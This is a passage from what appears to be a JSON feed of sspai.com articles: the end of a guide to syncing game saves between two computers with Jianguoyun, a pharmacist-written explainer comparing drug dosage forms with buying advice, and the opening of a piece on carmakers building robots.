src=\"https://cdn.sspai.com/2021/09/07/article/fc4c7df2286a561ffcaa96513e3777c9\"></figure><p>那么，我们首先在电脑 A 找到《饥荒 联机版》的存档目录：<code>C:\\Users\\userName\\Documents\\Klei\\DoNotStarveTogether\\188674497</code>，这里面保存了游戏的地图和存档信息。我们在其右键菜单选择「坚果云 &gt; 同步该文件夹」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/ee571870872d3778a78c4b1e83f44b41\"></figure><p>此时坚果云会弹出「同步文件夹」的确认窗口：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/b29c1156645648e96d23e2bf2b70c390\"></figure><p>点击「完成」，坚果云就会开始将目录里的文件同步到云端。同步完成后，目录图标左下角会变成绿色对勾：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/5fef295f2502125e5fc877b7cfd26a74\"></figure><p>现在我们可以将电脑 A 关机，打开电脑 B 并启动坚果云。此时，坚果云弹窗「您有新的同步文件夹」：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/3fd552b9b6591ad4a084254588f17646\"></figure><p>我们点击「同步到本地」，在下一个页面中点击「浏览」设置同步到电脑 B 的目录，来将同步文件夹放置到《饥荒 联机版》的存档目录中：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/07/article/b5fb98ee04c7963b3a6e5458a6b2f3dd\"></figure><p>这里需要注意坚果云的同步逻辑，游戏的存档目录是：<code>C:\\Users\\userName\\Documents\\Klei\\DoNotStarveTogether\\188674497</code></p>\n<p>但由于我们要设置的是<code>\\188674497\\</code>这个文件夹的放置目录，因此我们选择的目录到<code>.\\DoNotStarveTogether\\</code>即可。设置完成后点击「确认」，坚果云开始将文件夹的所有文件同步到电脑 B 中。等待同步完成后，我们开启游戏，游戏会去读取我们从电脑 A 同步过来的存档文件，我们就可以在电脑 B 上继续游戏进度了。</p>\n<p>我们在电脑 B 上结束并退出游戏后，坚果云会自动将同步文件夹中内容有改动的文件进行同步到电脑 A ，我们基于坚果云的游戏同步就完成啦。</p>\n<p>当使用这个方法同步了多个游戏的存档文件夹时，我们可以在坚果云客户端中进入该文件夹的「基本信息」来修改同步文件夹的名称以加区分，在云端修改文件夹名字只相当于备注，不会影响到两台电脑上的本地路径，这点十分好评。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/07/article/1e65acea09bcefe2f48b8ddab9703232\"></figure><figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/09/07/article/6cd7812442484538f3c4c6031707fe4e\"></figure><p>最后再分享两点 Tips：</p>\n<ol>\n<li>对于游戏存档的具体位置，善用百度搜索「xxx 游戏存档位置」。</li>\n<li>建议在两台电脑都设置坚果云「开机自动启动」，可以做到真正的无感游戏同步体验。坚果云挺轻量，平时不会占用太多 CPU 和内存资源。</li>\n</ol>\n<h2>结语</h2>\n<p>很少会有一款软件能在某个领域让所有用户都满意，所以少数派才会存在如此多的软件分享。选择什么样的工具、用它来完成怎样的事情，决定权全在自己手中，只要能找到适合自己的方式就是最好的。如果你也有类似的奇怪用法，「这个软件本来是用来做这个的，但是你却用来做那个；或者本来有专门的软件用来做这个，你偏要用别的软件做这个」，不妨在评论区一起友好交流和分享吧。</p>\n<h4>关联阅读：</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/64751\" target=\"_blank\">怎样用手边的工具做一份出彩的简历？我们的简历工具和技巧分享</a></li>\n<li><a href=\"https://sspai.com/post/63111\" target=\"_blank\">使用 Keynote 制作动图表情</a></li>\n<li><a href=\"https://sspai.com/post/63039\" target=\"_blank\">我用 Figma 做表情包</a></li>\n</ul>\n<p>题图：<a href=\"https://www.freepik.com/free-vector/multitasking-concept-illustration_6622372.htm#page=1&amp;query=work&amp;position=11\" target=\"_blank\">Designed by pikisuperstar - www.freepik.com</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68633"},{"title":"药片、颗粒还是胶囊：聊聊你或许从未关注过的药物剂型","date":"2021-09-13 06:24:50","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>当你打开淘宝，想要购买止痛药的时候，一定有过面对着琳琅满目的搜索结果却不知该如何下手的迟疑。</p>\n<p>同样是布洛芬，药片、缓释胶囊、颗粒、咀嚼片、混悬液……琳琅满目。它们之间都有什么区别？哪种疗效更好？贵的是不是更好？是不是一定要买在包装上写着「为生理期特别设计」的那种才能对经痛有效？</p>\n<p>本文将会介绍不同的药物剂型，讲述它们的特性以及在药效、价格之间的差异，并在文末提出购买建议。</p>\n<h2>文前注意事项</h2>\n<ul>\n<li>作者在英国接受药学教育及相关实践。不同国家之间的医疗体系、药品相关规定及具体执行必然存在差异，并且会随着时间变化。成稿之前做过一定程度的事实调查（fact check），并不能保证完全正确，与现实有偏差的地方欢迎指正。术语翻译参照了全国科学技术名词审定委员会建立的 <a href=\"https://www.termonline.cn/\" target=\"_blank\">术语在线</a>；对于没有收录的术语，参照了文献的用词，并尽可能附上英语原词。</li>\n<li>以口服药物为主。不适用于中医药及中西药复合制剂。</li>\n<li>本文只是概括性的介绍药物剂型的基础知识，并非提供医疗指导或建议，也不能对治疗每个病人、每一种病的每一种药的每一个剂型负责。如果对某个药物的使用方式有疑问，请与熟悉您身体状况的医生讨论。</li>\n</ul>\n<h2>剂型</h2>\n<h3>什么是剂型？</h3>\n<p>每一个上市售卖的药品，其成分并不只是药品里的活性成分。为了使方便其储存、使用，通常还会加入其他辅料，经过一条条药厂流水线，才变成了我们熟悉的样子。最终成品将会有着各种各样的形态，药片、胶囊、喷剂、乳膏……这些药品的形态就可以简单地理解为药物的剂型。</p>\n<p>在欧盟药品管理局（EMA）列出的几百种剂型里，有些适合口服，如药片、胶囊、悬浊液；有些适合外用，如喷剂、贴剂、乳膏；有些则是注射时会用到的针剂。还有一些更为稀有，如宫内片剂（intrauterine tablets）和入浴剂（bath additives），其实都算得上是一种剂型。<sup class=\"ss-footnote\" href=\"\" title=\"EMA (n.d.) List of Pharmaceutical dosage forms. Available at: https://www.ema.europa.eu/documents/other/list-pharmaceutical-dosage-forms_en.xls\" footnote-id=\"1\">1</sup></p>\n<p>但，无论剂型有多少种，其目的都是将一定数量的药物，在适宜的时间内，送去适宜的地方，使其发挥出适宜的功效。</p>\n<h3>为什么要有这么多不同的剂型？</h3>\n<p>相信有很多人觉得，市面上有这么多种剂型，纯粹是医药公司为了牟利搞出的花样。这个说法在某种程度上并不能算错，确实有很多医药公司为了最大化利用新药推出后的专利保护期，在研发成功后依旧不断研发新的剂型，以此延长他们的独家销售时间<sup class=\"ss-footnote\" href=\"\" title=\"除了开发新的剂型之外，还可以：给药物申请新的适应症；把多种药物组合到一起；单独异构体（single enantiomer）；等等。扩展阅读：Product line extension.\" footnote-id=\"2\">2</sup>。在 2013 年，羟考酮（oxycodone）防篡改（tamper-resistant）且更难滥用（abuse）的新剂型就通过了 FDA 的审核，推后了允许其仿制药上市的期限<sup class=\"ss-footnote\" href=\"\" title=\"Meier, B. (2013). F.D.A. Bars Generic OxyContin. The New York Times. Available at: https://www.nytimes.com/2013/04/17/business/fda-bars-generic-oxycontin.html\" footnote-id=\"3\">3</sup>。</p>\n<p>然而，这么做并非全部为了利益。更多的时候，丰富的药物剂型也让人们在服药的时候有了更多的选择，接受治疗时感受更好，也相应地提升了治疗效果。不习惯吞咽、或者难以吞咽药片的人，可以选择把分散片（dispersible tablet）化在水中再整杯喝掉；缓释的降血糖药可以减少患者低血糖休克的概率；使用副作用较大的药物时，施用小剂量在「患处」与口服较大剂量相比，起效通常更快，而副作用则较小（如哮喘患者通常需要使用的的皮质类固醇激素<sup class=\"ss-footnote\" href=\"\" title=\"Toogood J. H. (1987). Efficiency of inhaled versus oral steroid treatment of chronic asthma. New England and regional allergy proceedings, 8(2), 98–103. https://doi.org/10.2500/108854187778994464\" footnote-id=\"4\">4</sup>）；也有相关研究发现，服用缓释的抗抑郁药物氟西汀（百忧解）的人，能更好地遵医嘱按时服药<sup class=\"ss-footnote\" href=\"\" title=\"Claxton, A., de Klerk, E., Parry, M., Robinson, J. M., &amp; Schmidt, M. E. (2000). Patient compliance to a new enteric-coated weekly formulation of fluoxetine during continuation treatment of major depressive disorder. The Journal of clinical psychiatry, 61(12), 928–932. https://doi.org/10.4088/jcp.v61n1207\" footnote-id=\"5\">5</sup>。</p>\n<h2>剂型带来的区别</h2>\n<blockquote><p>没有最好的剂型，只有最合适的剂型。</p></blockquote>\n<p>在进入市场之前，所有药物都必须经过一系列质量检测，通过后才能获准上市。这里的质检包括了：药物的规格、内容物的含量，并且会模拟进入体内后发生的一系列反应，以及存储在极端环境下药品的降解、变质对活性成分的影响，达到一定标准后才能销售。对仿制药来说，还需要和「原版」的释放曲线对比，没有过大的偏差才算通过。</p>\n<p>因此，在市面上可以买到的药物，无论生产厂家是谁，只要是相同剂量、相同剂型的，药品的活性成分在体内的效果都不会有太大的差别。故而以下描述的剂型差别更多的是使用感上的差异，而非药效上的。</p>\n<figure class=\"ss-imgRows\" figcaption=\"实验室里模仿胃部环境的仪器，会把药品扔进装着 900 mL 0.1 M 盐酸并维持 37°C 的容器里搅动 60 分钟，每隔十分钟取出一些液体并分析有多少药品溶解。图：Nandiraju, L. (2019)\"><img src=\"https://cdn.sspai.com/2021/09/10/1f39e22f1a52797ff4761ff7b63efe16.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/10/2dc06b2b16d9b955da636abd0a10a95a.jpeg\" alt=\"\"></figure><h3>药片和胶囊</h3>\n<p>药片和胶囊应该是大多数人在生活中接触最多、最熟悉的两个剂型了。虽然看起来不太一样，但让它们起效的都是其中的活性成分。只不过一个是药粉和辅料混合物压成的药片，另一个是把混合物放进了胶囊壳里。</p>\n<p>标注含量相同的药片和胶囊，在体内释放的和活性成分含量也应该是一样的。在药品上市之前，都需要通过相关部门的检查，以确保成品的稳定性和安全性。因此，虽然这两种剂型的特性有所区别，但当我们吃下它们，最终被人体吸收的药量并不会与预定值有着太大的出入。</p>\n<p>由于这两种剂型有着不同的特性，因此它们在施放时间可能会有些许差异。在不考虑任何特殊设计的情况下，胶囊中的活性成分会更快地被身体吸收，且吸收效率可能会更高。这是因为在服药后，胶囊的外壳在消化道内解体，内容物就可以直接与消化道接触、溶解，并被上皮细胞吸收，进入血液循环。因为已经有了胶囊外壳的保护，所以胶囊内容物通常都是以较为松散的药粉形式存在的。</p>\n<p>而对片剂来说，虽然它们是由药粉压制而成，但为了保证它的形状，粉末与粉末之间会结合得更紧密，不像是胶囊中那种松散的状态，溶解药粉会更困难，所需的时间也会更长。其次，即使在混合粉末的时候已经尽可能地让活性成分和辅助溶解的配料均匀分布，但在实际操作中可能无法次次都达成最理想的情况，这就导致了在药片可能并不是以一个均匀的速度完全溶解的，影响了吸收效率。</p>\n<p>除此之外，药片和胶囊还有许多其他的区别。</p>\n<p>首先从价位来说，药片的制造成本更低，所以相同厂家生产的药片和胶囊，往往都是药片更便宜一点。</p>\n<p>其次则关于药品的活性成分和剂量。有了胶囊壳的保护，就可以在一定程度上延长易氧化药物的保质期。另外，虽然胶囊的内容物大多数为粉末，但也有填充液体的胶囊面世。对许多难溶于水的药品来说，事先将其溶解并放进胶囊里，进入消化道后就不必先等药粉溶于消化液后才能进入血液循环，因此起效更快。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/94540e252d3f8d98f1d9c5063b1653fe.jpg\"><figcaption>普通胶囊 vs 液体胶囊</figcaption></figure><p>但另一个方面，许多药品的片剂可以掰成两半，方便医生根据病情进展和身体状况调整药量。对于吞咽困难的人来说，使用咀嚼片和分散片也能服药的过程轻松很多。而且由于工艺的原因，在不显著影响吞咽难度的前提下，药片的剂量上限是比胶囊更高的。此外，在药片的最外层可以很方便地加上一层糖衣，如果对口味有要求的话，或许也是一个小小的加分项。</p>\n<p>如果是为了家庭的长时间储存，药片和胶囊的区别并不大。对药片和胶囊影响最大的因素就是湿度，而现在药品包装中常见的铝箔可以在一定程度上避免氧气与水蒸气影响药品的稳定性，只要不是放在浴室这种高湿度的地方，大部分时间都不会影响药品的性质。因此只要确保家庭药箱的药品都在保质期内，长期存放药片或是胶囊的区别不会那么显著。</p>\n<h3>固体和其他</h3>\n<p>这里的「固体」指的是如胶囊和药片这样的口服固体剂型，「其他」剂型则是其他非固体剂型，如悬浊液、气雾剂、和许多外用剂型，分散片、咀嚼片这些虽然从形态而言算是固体，但是它们从服用药物的角度来说和传统的胶囊药片大有不同，因此也算在「其他」之列。</p>\n<p>诚然，药片和胶囊便宜、熟悉、易于使用，是大多数人在购买药物时的首选。但是还有很多人因为种种缘故无法吞咽自如，这种情况下，非固体剂型对他们来说就更友好一些。尤其是老年人，食道肌肉退化的同时，需要吃的药也大概率比年轻人要多很多，不断吞服药片无疑是在给他们增加新的一重负担。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/2638ecb1d6e1fe2530937b89a4c81ff1.png\"><figcaption>从左至右分别是：10 美分硬币；常见的缓释药片；腰果；常见的胶囊；榛子。大部分人吃腰果和榛子都需要咀嚼，吃药时却希望人们能直接把药吞下去。(Lau, et al., 2018)</figcaption></figure><p>如果想要解决吞咽困难的问题，通常来说有三种途径：</p>\n<ul>\n<li>非固体口服剂型：如溶液、混悬液，颗粒在某种程度也算是。</li>\n<li>非传统固体口服剂型：咀嚼片、分散片、泡腾片、口腔速崩片（oral dispersible tablets）……</li>\n<li>非口服剂型：如气雾剂、贴剂，以及各种注射剂。</li>\n</ul>\n<p>这些和胶囊、药片相比，固然在一定程度上解决了吞咽困难的问题，却也带来了其他的顾虑。首先就是成本，想要做出更「复杂」的剂型，设计和生产的成本就会相应提高；即使实际成本并没有那么高，定价一般来说也会比普通剂型更高一点的。</p>\n<p>其次是易得性，不是所有药品都有其他方便的剂型可选，即使有，选择也有限。而受药物本身性质所限，比如脂溶性高的药物，口服时就比做成贴剂时吸收效率更高。</p>\n<p>还有就是易操作性。像是大部分的注射剂都需要受过专业训练的人员帮忙注射，而对于气雾剂这类需要吸入的药物，使用技巧就万分重要了。我曾经在课上用仪器测试过，如果我使用某种吸入剂的话，将会有多少被成功吸进肺部。而即使我对它的吸入技巧和注意事项烂熟于心，最成功的一次也只吸入了标定剂量的 5% 上下。大多数医疗机构并不会提供这类医疗器械的相关说明和训练，也造成了使用时的一种隐患。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/954b10a0ddba7a01e1192045ece476e2.gif\"><figcaption>图中人物在向医生展示吸入剂的正确用法。实际上吸入剂应该从嘴部吸入，而不是喷在皮肤上。视频来源自《豪斯医生 第五季》第十一集「Joy to the World」。</figcaption></figure><p>不过，像是吸入剂、外用药这些非口服剂型，它们不仅仅是吞咽困难人士的另一种选择，在完成「把药物送到目的地」这件事上，它们可以说是「走了一条捷径」。虽然没有静脉注射那么快速，有些时候也无法避过代谢，但对有些症状来说，或许比口服更有效。</p>\n<h3>局部和整体</h3>\n<p>大多数口服药起效的原理，是药物中的活性成分进入血液，随着循环系统抵达「目的地」，并在那里产生相应的生化反应，以此达成我们所说的「药效」。在这个过程中，药物随着血液流遍全身，有些甚至可以通过血脑屏障进入大脑。由于我们无法控制药物的流向，也无法阻止它们在有着相似结构的非目标器官里产生类似的生化反应，这就是药物副作用的由来。</p>\n<p>这是口服药物和注射药物不可逃脱的宿命，有些吸入类药物也有相似的机制。</p>\n<p>然而，除了在体内循环起效之外，还有一种药物可以避开循环系统，它们就是「局部药物」（local formulations）。外用药膏就是一种局部药物，除此之外还有用在眼、耳，以及私密部位的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/23c967e34c665bf5841b93a4a4c602e3.jpg\"><figcaption>淘宝搜索「外用药」：膏、贴、喷剂</figcaption></figure><p>顾名思义，局部药物只会在施用处附近起效，到达「目的地」的时间更短，相对而言起效会更快。药品中的活性成分只有少量会进入循环系统，因此几乎不会被分流到其他的器官，或随着血液进入肝脏参与代谢<sup class=\"ss-footnote\" href=\"\" title=\"首过效应（first-pass metabolism）。口服药物在被肠道吸收后进入肝脏，经过代谢后才被血液运输至其他部位。此举本意是为了防止毒素侵袭，却也会对血液中药物的浓度产生影响。有些药物正是利用了这一特性，将一个结构稍有不同却更易被人体吸收的物质做成药物，经过肝脏代谢后才变成了真正起效的「活性成分」（依那普利，Enalapril）。扩展阅读：前体药物 / prodrug）。\" footnote-id=\"6\">6</sup>，所以只需要和口服相比更小的剂量，起到相似水平的效果。</p>\n<p>这些药物在使用后不会有太多进入循环系统，即使进入的剂量大过了导致副作用的阈值，这样的剂量和口服相比还是九牛一毛。其副作用更多地出现在药品施用处，比如药膏可能导致皮肤的过敏反应；眼药水可能使视线模糊；滴耳液会在一定程度上影响听力；等等。而且相比于口服药物，这些药品更难控制使用的剂量，不像吃一颗药片那样，标明了有多少活性成分，就会吃下多少活性成分。</p>\n<p>对于有些症状，局部和「全身」药品都能起效。这种情况下，该如何做选择呢？</p>\n<p>选择局部药物的时候，可以想一想是否符合以下条件：</p>\n<ul>\n<li>这个症状是否只存在于某个「局部」？</li>\n<li>症状来源是否是「局部药物」可以接触到的地方？比如胃痛和肌肉痛，前者太过“深层”，外用药物很难达到。而对于头皮或眼球这种血流量并不算丰富的药物，即使口服药物，能成功到达的数量也不会太多。</li>\n<li>是否会有严重的副作用？如类固醇药物，治疗湿疹非常有效，但是口服会带来很严重的副作用。</li>\n</ul>\n<p>以上仅作参考，最重要的是根据不同的病因，选择合适的药物。即使是简简单单的「肚子疼」，也会有各种各样的成因。或许是胃酸过多产生的灼烧感，或许是经痛，或许是肌肉带来的疼痛，也有可能是内部器官的器质性病变带来的。如果依据自己无法判定，请咨询医生寻求更专业的意见。</p>\n<h3>缓释和速释</h3>\n<p>「速释药物」指的是在设计剂型的时候，没有改变药物的释放方式和时间的药物。在「缓释药物」里，释放的位置和/或时间都有可能经过调整。</p>\n<p>没有经过特殊设计的药物通常都会在胃里解体，随之而来的就是药物活性成分的释放。而经过设计后，就有了不同的性质。有些在外壳上做文章，使其在像胃这样的强酸性环境中保持稳定，等到小肠这种弱碱性环境下才开始分解；有些则是给药里面的各种成分「分层」：最外层的最先被溶解，与内层药物之间隔着一层其他需要花一定时间溶解的物质，这样以来药物吸收的时间就拉开了先后。不论是片剂还是胶囊，都能见到这样的设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/10/00b1575ba7db35e47cde2fb0e8a6c9d0.jpg\"><figcaption>缓释普萘洛尔（propranolol），可以看到里面有非常多的小颗粒，每一个小颗粒里面都装着一定数量的药物，溶解完最外层后再来溶解一个个小颗粒。</figcaption></figure><p>有些药物调整了释放的时间，其中的活性成分就可以在某个时间段内持续不断地释放，并被人体吸收，以达到更持久的药效。比如有些止痛药，吃一粒即可有持续不断的解痛效果，不必每隔几个小时都吃一粒缓解，也在一定程度上避免了多次服药带来的抗拒，且减少了药物的摄入量——即使是最常见的止痛药，在一定时间内摄入过量也有可能对身体造成危害。</p>\n<p>另一个常见的例子是用来治疗糖尿病的二甲双胍，通常在饭后服用。对于有些病人来说，缓释药物能在饭后的几小时内促进胰岛素的释放，既能与餐后上升的血糖相互抵消，又不至于有低血糖的风险。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/03070acf129666bc331c929d8a140f66.png\"><figcaption>缓释药物和速释药物随着时间变化，血液中药物浓度的变化</figcaption></figure><p>而有些药物改变的是释放的位置。有些在极端酸碱性环境下容易改变性质的药物或药品成分，很显然并不适合释放在强酸性的胃液里；有些难溶于水的药物，胃液数量有限，不足以让它们溶解并被人体吸收；对有些药物来说，只有在肠道的某些部分才能被吸收。经过设计后，这些药品才能在体内起到最大的作用。</p>\n<p>同样地，缓释和速释药物之间并没有绝对的「谁比谁好」，而只能说是「哪一种更适合」。需要持久药效的药物，如持续的疼痛，肯定是缓释药物更合适；如果需要立刻缓解，起效更快的速释药物就更有优势了。有些缓释药物也在配方里同时结合了速释和缓释的成分，让整个过程变得更简单方便。</p>\n<h2>购买建议</h2>\n<blockquote><p>如果没有特殊需求的话，一律选最便宜的。</p></blockquote>\n<p>像我在前面讲过的，所有药物在上市前都必须经过相应的药效检查，因此相同的剂量、相同的剂型，服用后的药效都不会差太多。区别可能来自于每一批在生产时的细微差异，以及每个个体对药品成分的不同反应。对大多数人、大多数药品、大多数症状来说，这些不同的地方不会造成太大的影响。</p>\n<p>唯一需要注意的可能是精神类药物，不同品牌的生产流程和使用的辅料不同，映射在每个人不同的神经系统里，可能会有不同的反应。比如某人吃 A 品牌的某药产生了难以忍受的副作用，但是吃 B 品牌的就不会有这样强烈的反应。</p>\n<p>但这件事更多地和个人体质相关，而非药物或症状。有些人对不同牌子的精神药物没什么感觉，可如果维生素补剂换了，他们立刻就能感觉到不对。如果出现了这样的问题，最简单的办法就是铆准同一个牌子的药物服用，并且在下次看医生提出希望开药的时候可以指定品牌。</p>\n<p>如果买了药之后，对药物有疑问，可以参照下面的表格：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th><strong>问题 / 来源</strong></th>\n<th><strong>药店买的</strong></th>\n<th><strong>医生开的</strong></th>\n</tr></thead>\n<tbody>\n<tr>\n<th><strong>药效不够</strong></th>\n<td>\n<p>阅读说明书，如果增量没问题，增量；</p>\n<p>如果多吃会导致服药过量，请咨询医生。</p>\n</td>\n<td>请咨询医生换药</td>\n</tr>\n<tr>\n<th><strong>副作用难以接受</strong></th>\n<td>\n<p>换一个牌子试试看</p>\n<p>（如果副作用来自药物本身，换品牌可能无法解决。请咨询专业人士后选购有相同功效的药物）</p>\n</td>\n<td>请咨询医生换药</td>\n</tr>\n</tbody>\n</table></figure><h3>一定要买对应症状的吗？</h3>\n<blockquote><p>如果活性成分、剂量、剂型都相同的话，不用。</p></blockquote>\n<p>这些都一样的话，那就可以说是完全相同，只有包装不同的药物了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/12/6cf2b542f5abe9751a3ac3370fff0401.png\"><figcaption>右边是同一个品牌出品为「关节和后背疼痛」的专门包装，但其实里面的东西应该都是一样的：布洛芬 200 mg 软胶囊 16 个/盒，「持续时间长达 8 小时」。(Dailychemist.com, n.d.; Chemist.net, n.d.)</figcaption></figure><p>但大多数时候，即使是为了治疗相同的症状，也会使用不同的药物。有些药品为了相对应的症状，会加入其他的药物以增强效果，或者延长药效。</p>\n<p>治疗头疼的药物里，有些是专门治疗偏头痛的舒马曲坦（sumatriptan），有些是普通的布洛芬、扑热息痛，也有更强效的萘普生（naproxen）和可待因（codeine），有些是多种止痛药的结合（可待因+扑热息痛，Co-codamol），有些还加入了咖啡因来增强止痛药的药效（如日本的EVE）。</p>\n<p>有些药物也会在其中加入其他类别的药物，通常是为了治疗同时出现的多个症状的。像是为了缓解感冒的不适，就可以服用布洛芬和扑热息痛；为了缓解鼻塞，还会加入伪麻黄碱（pseudoephedrine）；为了止咳，加入右美沙芬（dextromethorphan）；缓解过敏导致的流鼻涕，同时还能助眠的盐酸异丙嗪（promethazine）<sup class=\"ss-footnote\" href=\"\" title=\"此处借用了 Day &amp; Night Nurse Capsules (GSK) 的配方。https://www.medicines.org.uk/emc/product/3921/smpc\" footnote-id=\"7\">7</sup>。这类组合药物就不适合拿来与单一成分的药品做比较了，权看使用者的需求。</p>\n<p>如果不确定什么样的药物最合适，从单一成分的药物开始最安全。如果服用后发现了药效不足或者其他问题，可以在询问药店工作人员后选择药效更强的，或者与医生讨论其他选择。</p>\n<h3>剂型优缺点对比</h3>\n<figure class=\"table\"><table>\n<thead><tr>\n<th><strong>剂型</strong></th>\n<th><strong>优点</strong></th>\n<th><strong>缺点</strong></th>\n</tr></thead>\n<tbody>\n<tr>\n<th><strong>片剂</strong></th>\n<td><ul>\n<li>便宜、常见、好买</li>\n<li>方便调整药量</li>\n<li>可以调整口味</li>\n</ul></td>\n<td><ul>\n<li>可能吞咽困难（但有分散片、咀嚼片等可以解决这个问题）</li>\n<li>需要一定时间起效</li>\n</ul></td>\n</tr>\n<tr>\n<th><strong>胶囊</strong></th>\n<td><ul>\n<li>便宜、常见、好买</li>\n<li>方便调整药量</li>\n</ul></td>\n<td><ul>\n<li>可能吞咽困难（虽然说有些也可以打开胶囊放入饮食中服用，但限制很多）</li>\n<li>需要一定时间起效</li>\n</ul></td>\n</tr>\n<tr>\n<th><strong>溶液/悬浊液</strong></th>\n<td><ul>\n<li>方便调整药量</li>\n<li>可以调整口味</li>\n<li>食用方便（婴儿；吞咽困难）</li>\n</ul></td>\n<td><ul>\n<li>存储、携带要求高</li>\n<li>保质期相对更短，长时间不用会结块</li>\n<li>可能更贵</li>\n</ul></td>\n</tr>\n<tr>\n<th><strong>外用药 / 吸入剂</strong></th>\n<td><ul>\n<li>起效相对较快</li>\n<li>副作用较小</li>\n<li>适合难以被胃肠道吸收的药物</li>\n</ul></td>\n<td><ul>\n<li>可能会污染衣物等</li>\n<li>有些外用药会留下痕迹，被人看到，可能会有一些心理压力</li>\n<li>有些剂型需要使用正确的技巧才能达到相应的效果</li>\n</ul></td>\n</tr>\n<tr>\n<th>注射用针剂</th>\n<td><ul>\n<li>几乎不会有剂量上的损失</li>\n<li>静脉注射起效是最快的</li>\n<li>适合难以被胃肠道吸收的药物</li>\n</ul></td>\n<td><ul>\n<li>通常需要在特定环境下，由受过训练的专业人士给药</li>\n<li>通常而言花费更多</li>\n<li>给药时可能造成疼痛</li>\n</ul></td>\n</tr>\n</tbody>\n</table></figure><h2>结语</h2>\n<p>虽然不同剂型的使用感和表现有所差异，但是它们最终的任务都是将一定数量的药物，在一定时间内送至想要它起作用的地方。在选购药物的时候，除了剂型，用的什么药、剂量多少，都同样值得注意。希望本文能帮助你了解到更多剂型之间的差异，并对你将来的选择有所帮助。</p>\n<hr>\n<p>题图：Unsplash @<a href=\"https://unsplash.com/@adamsky1973\">Adam Nieścioruk</a></p>\n<p>正文图片如无标注，则均为自摄。</p>\n<p>注释中未列出的参考资料：</p>\n<ul>\n<li>Lecture notes, 2017-2020.</li>\n<li>Aulton, M., et al. (2017). <i>Aulton's Pharmaceutics: The Design and Manufacture of Medicines</i>. Elsevier. ISBN: 9780702070051.</li>\n<li>Hong, S. H., Shepherd, M. D., Scoones, D., &amp; Wan, T. T. (2005). Product-line extensions and pricing strategies of brand-name drugs facing patent expiration. <i>Journal of managed care pharmacy : JMCP</i>, <i>11</i>(9), 746–754. https://doi.org/10.18553/jmcp.2005.11.9.746.</li>\n<li>Lau, E., Steadman, K., Cichero, J., &amp; Nissen, L. (2018). Dosage form modification and oral drug delivery in older people. <i>Advanced Drug Delivery Reviews</i>, <i>135</i>, 75-84. doi: 10.1016/j.addr.2018.04.012</li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68691"},{"title":"小鹏、小米、特斯拉：车企组团造机器人这件事，到底有多靠谱？","date":"2021-09-13 03:32:54","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<blockquote><p>十年后的生活：特斯拉的机器人骑着小鹏的机器马在路上遛小米的机器狗。</p></blockquote>\n<p>这是知乎网友「吾日三省吾身」在小鹏发布智能机器马后的调侃。</p>\n<p>9 月 7 日，小鹏汽车正式公布了生态企业新成员<strong>深圳鹏行智能研究有限公司</strong>，并发布了首款智能仿生四足机器人——全球首款可骑乘的<strong>智能机器马小白龙</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/11/article/fedb2274e3b7584a2f04d7c411386cde\"></figure><p>在 8 月 20 日的特斯拉 AI 日上，Elon Musk 带来了仿生机器人 Tesla Bot。宣布造车的小米则是在 8 月 10 日推出了昵称为「铁蛋」的四足仿生机器人 CyberDog。</p>\n<figure class=\"image ss-img-wrapper\"><img 